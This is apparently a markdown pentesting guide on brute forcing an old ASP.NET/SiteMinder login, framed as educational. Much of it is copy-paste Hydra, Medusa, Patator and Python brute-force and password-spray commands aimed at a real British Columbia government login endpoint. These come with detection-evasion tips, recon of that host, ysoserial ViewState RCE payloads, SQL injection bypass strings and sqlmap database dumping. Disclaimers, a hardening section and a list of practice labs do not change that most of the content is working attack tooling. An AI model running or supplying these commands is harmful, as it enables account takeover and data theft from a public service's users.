# Self-Serve Hacking Guide
> **Educational pentesting for authorized systems only**
> Focus: Brute forcing old ASP.NET + SiteMinder logins

---

## Quick Nav
- [Brute Force 101](#brute-force-101) - Start here
- [ASP.NET Attacks](#aspnet-specific-attacks) - Deep dive
- [Tools](#tools-commands) - Copy-paste ready
- [Legal Practice](#legal-practice) - Where to learn safely

---

## Brute Force 101

### What is Brute Force?
Try every password until you find the right one. That's it.

**Example:**
- Password is "cat"
- Try: a, b, c, cat ✓ FOUND

**Real World:**
- 8-character password = 218 trillion combinations
- Try 1000/sec = 6,900 years
- BUT most people use weak passwords from common lists
- RockYou wordlist (14M passwords) = 4 hours at 1000/sec

### Why Old ASP.NET is Easy Target

**Modern site:**
- Rate limiting (5 tries → locked out)
- CAPTCHA after 3 fails
- Account lockout after 10 fails
- MFA required
- Password strength enforced

**Old ASP.NET (2005-2008):**
- ❌ No rate limiting
- ❌ No CAPTCHA
- ❌ No account lockout
- ❌ No MFA
- ❌ Weak password requirements
- ✅ **Can try unlimited passwords**

**BC Self-Serve specifically:**
- ASP.NET 2.0-ish (18 years old)
- SiteMinder auth (Oracle legacy product)
- Login URL: `logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi`
- No visible rate limiting
- Session management is broken (logs you out immediately)

---

## Step-by-Step: Brute Force BC Self-Serve Login

### Step 1: Map the Login Form

**Manual recon:**
```bash
# 1. Browse to site
open https://myselfserve.gov.bc.ca

# 2. Click "Sign in"
# Redirects to: https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi?...

# 3. View page source (Ctrl+U or Cmd+U)
# Look for <form> tag
```

**What you find:**
```html
<form action="/clp-cgi/capBceid/logon.cgi" method="POST">
  <input name="user" type="text">
  <input name="password" type="password">
  <input name="btnSubmit" type="submit" value="Sign In">
</form>
```

**Key details:**
- **POST URL:** `/clp-cgi/capBceid/logon.cgi`
- **Username field:** `user`
- **Password field:** `password`
- **Submit button:** `btnSubmit`

### Step 2: Capture a Login Attempt

**Use browser DevTools:**
```
1. Open DevTools (F12)
2. Go to Network tab
3. Enter fake credentials: user=test, password=test123
4. Click "Sign In"
5. Find POST request in Network tab
6. Click it → View Headers
```

**What you see:**
```
Request URL: https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi
Request Method: POST
Status Code: 200 OK (failed login)

Form Data:
user=test
password=test123
btnSubmit=Sign+In
```

**Failed login response:**
- Status: 200 (not 401 - they don't use proper HTTP codes)
- Body contains: "Invalid username or password" or similar error

**Successful login response:**
- Status: 302 (redirect)
- Location header: `https://myselfserve.gov.bc.ca/Auth/Login`
- Sets cookies: `ASP.NET_SessionId`, `SMSESSION`

### Step 3: Test with curl

**Single login attempt:**
```bash
curl -X POST 'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
  -d 'user=myusername&password=wrongpass&btnSubmit=Sign+In' \
  -i

# -i = include headers in output
# Look for: 302 redirect = success, 200 + error message = fail
```

**What to look for:**
```
# Failed:
HTTP/1.1 200 OK
... page contains "Invalid" or "incorrect" ...

# Success:
HTTP/1.1 302 Found
Location: https://myselfserve.gov.bc.ca/Auth/Login
Set-Cookie: ASP.NET_SessionId=abc123; path=/; secure
Set-Cookie: SMSESSION=xyz789; path=/; secure
```

### Step 4: Brute Force with Hydra

**Install Hydra:**
```bash
# Kali Linux (pre-installed)
hydra

# Ubuntu/Debian
sudo apt update
sudo apt install hydra

# macOS
brew install hydra

# Windows (WSL2 or download binary)
```

**Basic attack:**
```bash
hydra -l MYUSERNAME -P /usr/share/wordlists/rockyou.txt \
  logon7.gov.bc.ca \
  http-post-form "/clp-cgi/capBceid/logon.cgi:user=^USER^&password=^PASS^&btnSubmit=Sign+In:F=Invalid"
```

**Breaking it down:**
- `-l MYUSERNAME` = Single username (you know yours)
- `-P rockyou.txt` = Password wordlist (14 million passwords)
- `logon7.gov.bc.ca` = Target domain
- `http-post-form` = Attack type
- `/clp-cgi/...` = Path to login script
- `user=^USER^` = Username parameter (^USER^ gets replaced)
- `password=^PASS^` = Password parameter (^PASS^ gets replaced)
- `F=Invalid` = Failure string (if response contains "Invalid" = failed attempt)

**Get rockyou.txt:**
```bash
# Usually in Kali:
ls /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# Download if missing:
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Top 1000 most common (faster testing):
head -1000 rockyou.txt > top1000.txt
hydra -l MYUSERNAME -P top1000.txt logon7.gov.bc.ca ...
```

**Advanced Hydra options:**
```bash
# Slower (avoid rate limiting)
hydra -l user -P pass.txt -t 4 -w 5 logon7.gov.bc.ca http-post-form "..."
# -t 4  = Only 4 parallel threads (default 16)
# -w 5  = Wait 5 seconds between attempts

# Verbose output
hydra -l user -P pass.txt -vV logon7.gov.bc.ca http-post-form "..."
# -vV   = Very verbose (show each attempt)

# Stop on first success
hydra -l user -P pass.txt -f logon7.gov.bc.ca http-post-form "..."
# -f    = Exit when password found

# Multiple usernames
hydra -L users.txt -P pass.txt logon7.gov.bc.ca http-post-form "..."
# -L users.txt = List of usernames to try

# Save results
hydra -l user -P pass.txt -o results.txt logon7.gov.bc.ca http-post-form "..."
# -o results.txt = Output successful logins to file
```

**Full example with all options:**
```bash
hydra \
  -l myusername \
  -P /usr/share/wordlists/rockyou.txt \
  -t 8 \
  -w 3 \
  -vV \
  -f \
  -o found.txt \
  logon7.gov.bc.ca \
  http-post-form "/clp-cgi/capBceid/logon.cgi:user=^USER^&password=^PASS^&btnSubmit=Sign+In:F=Invalid:H=User-Agent\: Mozilla/5.0"

# H= sets custom headers (optional, helps avoid detection)
```

### Step 5: Identify Success

**Hydra will show:**
```
[ATTEMPT] target logon7.gov.bc.ca - login "myuser" - pass 1/14344392 - "password123"
[ATTEMPT] target logon7.gov.bc.ca - login "myuser" - pass 2/14344392 - "123456"
[ATTEMPT] target logon7.gov.bc.ca - login "myuser" - pass 3/14344392 - "12345678"
...
[80][http-post-form] host: logon7.gov.bc.ca   login: myuser   password: correctpass
```

**What happens:**
- Hydra tries passwords in order
- Shows progress: "pass 1234/14344392"
- When it finds valid password → prints with `[80][http-post-form]`
- Saves to file if you used `-o`

---

## Tools & Commands

### 1. Hydra (Fast Brute Force)

**Best for:** HTTP forms, SSH, FTP, SMTP, etc.

```bash
# HTTP POST form (most common)
hydra -l admin -P passwords.txt example.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# HTTP GET form (rare)
hydra -l admin -P passwords.txt example.com http-get-form \
  "/login.php?username=^USER^&password=^PASS^:F=incorrect"

# HTTPS (add -s 443)
hydra -l admin -P passwords.txt -s 443 example.com https-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# SSH brute force
hydra -l root -P passwords.txt ssh://192.168.1.100

# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# RDP brute force
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

**Common failure strings:**
- `F=Invalid` - Response contains "Invalid"
- `F=incorrect` - Response contains "incorrect"
- `F=failed` - Response contains "failed"
- `F=error` - Response contains "error"

**Success strings (alternative):**
```bash
# Use S= instead of F= if you know success message
hydra ... "S=Welcome"  # Success if response contains "Welcome"
hydra ... "S=Dashboard"  # Success if redirects to dashboard
```

### 2. Burp Suite Intruder (More Control)

**Setup:**
```
1. Install Burp Suite Community (free)
2. Set browser proxy: 127.0.0.1:8080
3. Browse to login page
4. Submit test login
5. In Burp: Proxy → HTTP history → Find POST request
6. Right-click → Send to Intruder
```

**Configure attack:**
```
Intruder tab → Positions:
  - Attack type: Sniper (one parameter)
  - Clear all markers (§)
  - Select password value → Add § marker
  - Should look like: password=§test§

Intruder tab → Payloads:
  - Payload type: Simple list
  - Click "Load" → Select rockyou.txt
  - Or add manually:
    password123
    admin123
    letmein

Intruder tab → Options:
  - Grep - Match: Add "Invalid" to detect failures
  - Throttle: 1000ms (1 second delay between requests)
  - Redirections: Always follow

Start Attack button → Go!
```

**Analyze results:**
```
Look for differences in:
- Length (successful login = different page size)
- Status code (302 redirect vs 200)
- Grep results (no "Invalid" = success)

Sort by:
- Length (outliers likely successful)
- Status (302 = redirect = likely success)
```

**Pro tip - Grep Extract:**
```
Intruder → Options → Grep - Extract
- Add rule to extract specific text
- E.g., extract "Welcome, [username]" from response
- If extraction succeeds → password worked
```

### 3. Custom Python Script (Full Control)

**Basic script:**
```python
#!/usr/bin/env python3
import requests
import time
import sys

# Config
URL = "https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi"
USERNAME = "myusername"
PASSWORDS_FILE = "passwords.txt"
DELAY = 2  # seconds between attempts

# Load passwords
with open(PASSWORDS_FILE, 'r', encoding='latin-1') as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"[*] Loaded {len(passwords)} passwords")
print(f"[*] Target: {URL}")
print(f"[*] Username: {USERNAME}")
print(f"[*] Starting attack...\n")

for i, password in enumerate(passwords, 1):
    # POST data
    data = {
        'user': USERNAME,
        'password': password,
        'btnSubmit': 'Sign In'
    }

    # Headers (look like real browser)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }

    try:
        print(f"[{i}/{len(passwords)}] Trying: {password[:20]:<20}", end=' ')

        # Send request
        r = requests.post(URL, data=data, headers=headers, allow_redirects=False, timeout=10)

        # Check response
        if r.status_code == 302:
            # Redirect = success
            print("✓ SUCCESS!")
            print(f"\n[+] FOUND: {password}")
            print(f"[+] Response: {r.status_code}")
            print(f"[+] Location: {r.headers.get('Location', 'N/A')}")
            sys.exit(0)
        elif r.status_code == 200:
            # Still on login page = failed
            if 'Invalid' in r.text or 'incorrect' in r.text:
                print("✗ Failed")
            else:
                print(f"? Unexpected response (length: {len(r.text)})")
        else:
            print(f"? Status: {r.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"ERROR: {e}")

    # Rate limiting
    time.sleep(DELAY)

print("\n[-] Password not found in wordlist")
```

**Run it:**
```bash
chmod +x brute.py
python3 brute.py
```

**Advanced features:**
```python
# Progress bar
from tqdm import tqdm
for password in tqdm(passwords, desc="Brute forcing"):
    ...

# Multi-threading (faster but riskier)
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=5) as executor:
    executor.map(try_password, passwords)

# Exponential backoff on errors
import random
def backoff(attempt):
    wait = min(300, (2 ** attempt) + random.random())
    time.sleep(wait)

# Save state (resume on crash)
with open('progress.txt', 'w') as f:
    f.write(str(i))
# On restart, read progress.txt and skip already tried passwords

# Proxy through Burp (for debugging)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
r = requests.post(URL, data=data, proxies=proxies, verify=False)
```

### 4. Medusa (Hydra Alternative)

```bash
# Install
sudo apt install medusa

# HTTP form brute force
medusa -h logon7.gov.bc.ca -u myusername -P passwords.txt -M web-form \
  -m FORM:"/clp-cgi/capBceid/logon.cgi" \
  -m FORM-DATA:"user=&password=&btnSubmit=Sign+In" \
  -m DENY-SIGNAL:"Invalid"

# Slower (4 threads, 3 sec delay)
medusa -h logon7.gov.bc.ca -u myusername -P passwords.txt -M web-form \
  -t 4 -T 3 ...
```

### 5. Patator (Most Flexible)

```bash
# Install
sudo apt install patator

# HTTP brute force
patator http_fuzz \
  url=https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi \
  method=POST \
  body='user=myusername&password=FILE0&btnSubmit=Sign+In' \
  0=passwords.txt \
  -x ignore:fgrep='Invalid'

# Custom success detection
patator http_fuzz ... \
  -x ignore:code=200 \
  -x accept:code=302
```

---

## ASP.NET Specific Attacks

### 1. ViewState Exploitation

**What is ViewState?**
- ASP.NET stores page state in hidden `__VIEWSTATE` field
- Encoded/encrypted data about form state
- If not properly secured → can be modified → RCE

**Find ViewState:**
```bash
curl https://site.com/login.aspx | grep VIEWSTATE

# Output:
<input type="hidden" name="__VIEWSTATE" value="wEPDwUKMTY3..." />
```

**Test if vulnerable:**
```bash
# Decode ViewState
echo "wEPDwUKMTY3..." | base64 -d | xxd

# Tools:
# - ViewState decoder: https://github.com/yuvadm/viewstate
# - ysoserial.net (for exploitation)
```

**Exploit (if MAC disabled):**
```bash
# Generate malicious payload with ysoserial.net
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -c whoami" \
  --path="/login.aspx" \
  --apppath="/" \
  --islegacy

# Replace __VIEWSTATE value in form
# Submit → RCE
```

**Defense:**
```xml
<!-- web.config -->
<pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
```

### 2. SQL Injection in Login

**Test for SQLi:**
```bash
# Username field:
admin' OR '1'='1' --
admin'--
' OR 1=1--
' OR 'a'='a
admin' /*
') OR ('1'='1

# Password field:
anything (doesn't matter if SQLi works in username)

# Both fields:
Username: admin
Password: ' OR '1'='1' --
```

**How it works:**
```sql
-- Original query:
SELECT * FROM Users WHERE username='admin' AND password='pass123'

-- With injection (username = admin' OR '1'='1' --):
SELECT * FROM Users WHERE username='admin' OR '1'='1' --' AND password='pass123'

-- Becomes (-- comments out rest):
SELECT * FROM Users WHERE username='admin' OR '1'='1'

-- '1'='1' is always true → returns all users → logs in as first user (admin)
```

**Automated SQLi detection:**
```bash
# sqlmap
sqlmap -u "https://site.com/login.aspx" \
  --data="username=admin&password=test" \
  --level=5 \
  --risk=3 \
  --batch

# If vulnerable:
sqlmap -u "https://site.com/login.aspx?id=1" --dump-all
# Dumps entire database
```

**Manual blind SQLi:**
```bash
# Time-based (response delays = SQLi exists)
admin' AND WAITFOR DELAY '00:00:05'--

# Boolean-based (true/false responses)
admin' AND 1=1--  # True (should work)
admin' AND 1=2--  # False (should fail)

# If responses differ → SQLi exists
```

### 3. Authentication Bypass

**Parameter tampering:**
```bash
# Some old ASP.NET apps check auth client-side

# Original request:
POST /secure.aspx
username=test&password=test

# Try adding:
POST /secure.aspx
username=test&password=test&authenticated=true

# Or:
POST /secure.aspx
username=test&password=test&role=admin&isAdmin=1

# URL manipulation:
https://site.com/admin.aspx?auth=true
https://site.com/admin.aspx?role=administrator
```

**Cookie manipulation:**
```bash
# Check cookies after login
curl -i https://site.com/login.aspx

# Look for:
Set-Cookie: isAdmin=false
Set-Cookie: userRole=user

# Try changing:
curl -b "isAdmin=true" https://site.com/admin.aspx
curl -b "userRole=admin" https://site.com/admin.aspx
```

### 4. Session Fixation

**Attack flow:**
```
1. Attacker gets session ID from login page (before auth):
   ASP.NET_SessionId=ABC123

2. Attacker sends victim this link:
   https://site.com/login.aspx?ASP.NET_SessionId=ABC123

3. Victim logs in using attacker's session ID

4. Attacker now shares victim's authenticated session:
   curl -b "ASP.NET_SessionId=ABC123" https://site.com/account

5. Attacker accesses victim's account without knowing password
```

**Test if vulnerable:**
```bash
# Get session ID before login
curl -c cookies1.txt https://site.com/login.aspx
cat cookies1.txt | grep SessionId

# Login with that session ID
curl -b cookies1.txt -d "user=test&pass=test" https://site.com/login.aspx

# Check if session ID changed after login
curl -b cookies1.txt -c cookies2.txt https://site.com/dashboard
diff cookies1.txt cookies2.txt

# If SessionId is SAME → vulnerable to session fixation
# If SessionId CHANGED → not vulnerable (session regenerated on auth)
```

### 5. Insecure Direct Object Reference (IDOR)

**Example:**
```bash
# View your profile:
https://site.com/profile.aspx?id=1234

# Try other IDs:
https://site.com/profile.aspx?id=1233
https://site.com/profile.aspx?id=1235

# If you can see other users' profiles → IDOR vulnerability
```

**Automated IDOR fuzzing:**
```bash
# Burp Intruder:
# Position: id=§1234§
# Payload: Numbers 1-10000
# Start attack → Look for 200 responses with data
```

---

## Password Spraying (Stealthier)

**Concept:** One password, many usernames

**Why:**
- Avoids account lockout (only 1 attempt per account)
- Evades rate limiting (spread across users)
- Higher success rate (people use common passwords)

**Common spray passwords:**
```
Password1!
Password123!
Spring2024!
Summer2024!
Fall2024!
Winter2024!
Company2024!
Welcome1!
Welcome123!
Changeme123!
[CompanyName]2024!
```

**Hydra password spray:**
```bash
# users.txt contains:
# john.smith
# jane.doe
# admin
# bob.jones

hydra -L users.txt -p "Password123!" logon7.gov.bc.ca http-post-form \
  "/clp-cgi/capBceid/logon.cgi:user=^USER^&password=^PASS^&btnSubmit=Sign+In:F=Invalid"

# Slow it down to avoid detection:
hydra -L users.txt -p "Password123!" -t 1 -w 10 ...
# -t 1  = 1 thread
# -w 10 = 10 seconds between attempts
```

**Python password spray:**
```python
import requests
import time

users = ['john.smith', 'jane.doe', 'admin', 'bob.jones']
password = 'Password123!'

for user in users:
    print(f"[*] Trying {user}:{password}")

    r = requests.post(
        'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi',
        data={'user': user, 'password': password, 'btnSubmit': 'Sign In'},
        allow_redirects=False
    )

    if r.status_code == 302:
        print(f"[+] SUCCESS: {user}:{password}")

    time.sleep(5)  # 5 second delay
```

---

## Defense & Hardening

### How to Prevent Brute Force

**1. Rate Limiting**
```csharp
// ASP.NET Core middleware
public class RateLimitMiddleware
{
    private static Dictionary<string, LoginAttempt> attempts = new();

    public async Task InvokeAsync(HttpContext context)
    {
        string ip = context.Connection.RemoteIpAddress.ToString();

        if (!attempts.ContainsKey(ip))
            attempts[ip] = new LoginAttempt();

        if (attempts[ip].Count >= 5 &&
            DateTime.Now < attempts[ip].BlockedUntil)
        {
            context.Response.StatusCode = 429;
            await context.Response.WriteAsync("Too many attempts. Try again in 5 minutes.");
            return;
        }

        await _next(context);
    }
}
```

**2. Account Lockout**
```csharp
// Lock account after 5 failed attempts
if (user.FailedLoginAttempts >= 5)
{
    user.LockedUntil = DateTime.Now.AddMinutes(30);
    db.SaveChanges();
    return "Account locked. Try again in 30 minutes.";
}
```

**3. CAPTCHA**
```html
<!-- Google reCAPTCHA v2 -->
<script src="https://www.google.com/recaptcha/api.js"></script>
<form method="POST">
  <input name="username">
  <input name="password" type="password">
  <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
  <button type="submit">Login</button>
</form>
```

```csharp
// Server-side validation
var recaptchaResponse = Request.Form["g-recaptcha-response"];
var isValid = VerifyRecaptcha(recaptchaResponse);
if (!isValid)
    return "CAPTCHA validation failed";
```

**4. Strong Password Policy**
```csharp
// Enforce on registration/password change
public bool IsStrongPassword(string password)
{
    return password.Length >= 12 &&
           Regex.IsMatch(password, @"[A-Z]") &&  // Uppercase
           Regex.IsMatch(password, @"[a-z]") &&  // Lowercase
           Regex.IsMatch(password, @"[0-9]") &&  // Number
           Regex.IsMatch(password, @"[^a-zA-Z0-9]");  // Special char
}
```

**5. Multi-Factor Authentication (MFA)**
```csharp
// After password verification:
var code = GenerateTOTP(user.MfaSecret);
SendSMS(user.Phone, $"Your code: {code}");

// User enters code
if (enteredCode != code)
    return "Invalid MFA code";
```

**6. Security Headers**
```xml
<!-- web.config -->
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="X-Frame-Options" value="DENY"/>
      <add name="X-Content-Type-Options" value="nosniff"/>
      <add name="X-XSS-Protection" value="1; mode=block"/>
      <add name="Strict-Transport-Security" value="max-age=31536000"/>
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

**7. Logging & Monitoring**
```csharp
// Log every login attempt
logger.LogWarning($"Failed login: {username} from {ip} at {DateTime.Now}");

// Alert on suspicious activity
if (failedAttempts > 10)
    SendAlert($"Potential brute force attack from {ip}");
```

---

## Legal Practice Platforms

**Where to practice these techniques legally:**

### 1. DVWA (Damn Vulnerable Web App)
```bash
# Run with Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# Access: http://localhost
# Login: admin / password
# Set security: Low
# Practice: Brute Force section
```

### 2. WebGoat (OWASP)
```bash
docker run -p 8080:8080 webgoat/webgoat

# Access: http://localhost:8080/WebGoat
# Complete: Authentication Bypasses, SQL Injection lessons
```

### 3. bWAPP (Buggy Web App)
```bash
docker pull hackersploit/bwapp-docker
docker run -d -p 80:80 hackersploit/bwapp-docker

# Includes: Login brute force, SQLi, session attacks
```

### 4. TryHackMe
- **URL:** https://tryhackme.com
- **Rooms:** "Authentication Bypass", "Brute Force", "OWASP Top 10"
- **Cost:** Free tier available

### 5. HackTheBox
- **URL:** https://hackthebox.com
- **Machines:** "Legacy", "Blue" (easy Windows boxes)
- **Cost:** Free tier, $14/mo VIP

### 6. PortSwigger Web Security Academy
- **URL:** https://portswigger.net/web-security
- **Labs:** Authentication vulnerabilities (100% free)
- **Topics:** Brute force, password reset, MFA bypass

---

## Wordlists & Password Generation

### Common Wordlists

```bash
# RockYou (14M passwords from 2009 breach)
/usr/share/wordlists/rockyou.txt

# SecLists (huge collection)
git clone https://github.com/danielmiessler/SecLists.git
# Passwords:
SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
SecLists/Passwords/Common-Credentials/best1050.txt
SecLists/Passwords/darkweb2017-top10000.txt

# Username lists
SecLists/Usernames/Names/names.txt
SecLists/Usernames/top-usernames-shortlist.txt
```

### Generate Custom Wordlist

**Crunch (pattern-based):**
```bash
# Install
sudo apt install crunch

# Generate 8-char passwords: 4 letters + 4 numbers
crunch 8 8 -t @@@@%%%% -o passwords.txt
# @ = lowercase letter
# % = number
# Generates: aaaa0000, aaaa0001, ..., zzzz9999

# Custom charset
crunch 6 6 -t pass%% -o passwords.txt
# Generates: pass00, pass01, ..., pass99

# All combinations (WARNING: huge file)
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o huge.txt
```

**CeWL (scrape target website):**
```bash
# Install
sudo apt install cewl

# Scrape words from company website
cewl https://company.com -m 6 -d 2 -w company-words.txt
# -m 6 = minimum word length 6
# -d 2 = depth 2 (follow links 2 levels deep)

# Add year/number mutations
john --wordlist=company-words.txt --rules --stdout > mutated.txt
```

**Hashcat Mask Attack:**
```bash
# Pattern: Capital letter + word + 2 numbers + special char
# Example: Password123!

hashcat -a 3 ?u?l?l?l?l?l?l?l?d?d?s
# ?u = uppercase
# ?l = lowercase
# ?d = digit
# ?s = special char
```

---

## Real-World Example: BC Self-Serve

### Reconnaissance

```bash
# 1. Identify tech stack
whatweb https://logon7.gov.bc.ca
# Output: ASP.NET, IIS 7.5, SiteMinder

# 2. Check SSL/TLS
nmap --script ssl-enum-ciphers -p 443 logon7.gov.bc.ca
# Look for weak ciphers

# 3. Directory enumeration
gobuster dir -u https://logon7.gov.bc.ca \
  -w /usr/share/wordlists/dirb/common.txt \
  -x aspx,asp,config

# 4. Check for exposed files
curl https://logon7.gov.bc.ca/web.config
curl https://logon7.gov.bc.ca/login.aspx.cs
curl https://logon7.gov.bc.ca/backup.zip
```

### Attack Simulation (Authorized Only)

**Scenario: You forgot your own password**

```bash
# 1. Create custom wordlist based on your password habits
# Your passwords usually: FirstName + Year + !
# Example: John2024!

cat > my-patterns.txt << EOF
John2020!
John2021!
John2022!
John2023!
John2024!
John2025!
Johnny2024!
John@2024
EOF

# 2. Run Hydra with custom list
hydra -l YOUR_ACTUAL_USERNAME -P my-patterns.txt \
  -t 2 -w 5 \
  logon7.gov.bc.ca \
  http-post-form "/clp-cgi/capBceid/logon.cgi:user=^USER^&password=^PASS^&btnSubmit=Sign+In:F=Invalid"

# 3. If found:
# [80][http-post-form] host: logon7.gov.bc.ca   login: youruser   password: John2024!
```

---

## Important Legal Disclaimer

### ✅ Legal (Do This)
- Test your own accounts/systems
- Practice on intentionally vulnerable apps (DVWA, WebGoat)
- Authorized penetration testing (written contract)
- Bug bounty programs (within scope/rules)
- Educational labs (TryHackMe, HackTheBox)

### ❌ Illegal (DON'T Do This)
- Brute force accounts you don't own
- Test third-party systems without authorization
- "Grey hat" testing to help (still illegal without permission)
- Access data you're not authorized to see
- Prove a point to company/school (ASK FIRST)

### Real Consequences
- **Criminal charges:** Computer Fraud and Abuse Act (US), Computer Misuse Act (UK)
- **Penalties:** Up to 10 years prison, $500k fines
- **Civil lawsuits:** Company can sue for damages
- **Career over:** Permanent criminal record

### Authorization Requirements
Before testing ANY system:
1. ✅ Written contract/agreement
2. ✅ Defined scope (what you can/can't test)
3. ✅ Point of contact at company
4. ✅ Rules of engagement
5. ✅ Safe harbor clause (protection from prosecution)

**Rule of thumb:** If you have to ask "Is this legal?" → It's not. Get written permission first.

---

## Quick Reference

### Brute Force Cheat Sheet

```bash
# Hydra - HTTP POST form
hydra -l USER -P PASSLIST HOST http-post-form "PATH:PARAMS:F=FAIL_STRING"

# Hydra - with rate limiting
hydra -l USER -P PASSLIST -t 4 -w 5 HOST http-post-form "..."

# Python one-liner
python3 -c "import requests; [print(requests.post('URL', data={'user':'USER','pass':p.strip()}).status_code, p) for p in open('passwords.txt')]"

# curl loop
while read pass; do curl -d "user=USER&password=$pass" URL; done < passwords.txt

# Test single password
curl -X POST 'URL' -d 'user=USER&password=PASS' -i
```

### SQLi Cheat Sheet

```sql
-- Login bypass
admin' OR '1'='1' --
admin'--
' OR 1=1--

-- Time-based blind SQLi
admin' AND WAITFOR DELAY '00:00:05'--

-- Union-based SQLi
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
```

### Password Patterns

```
Common patterns:
- [Word][Year]! → Password2024!
- [Season][Year]! → Summer2024!
- [Company][Year]! → Microsoft2024!
- [Name][Number]! → John123!
- [Word]@[Number] → Admin@123

Crunch patterns:
@@@@%%%% = 4 letters + 4 numbers
^^@@%%%% = 2 uppercase + 2 lowercase + 4 numbers
```

---

**Last Updated:** 2026-01-18
**Version:** 1.0

**Remember:** Authorization = Legal. No authorization = Illegal. Don't go to jail.
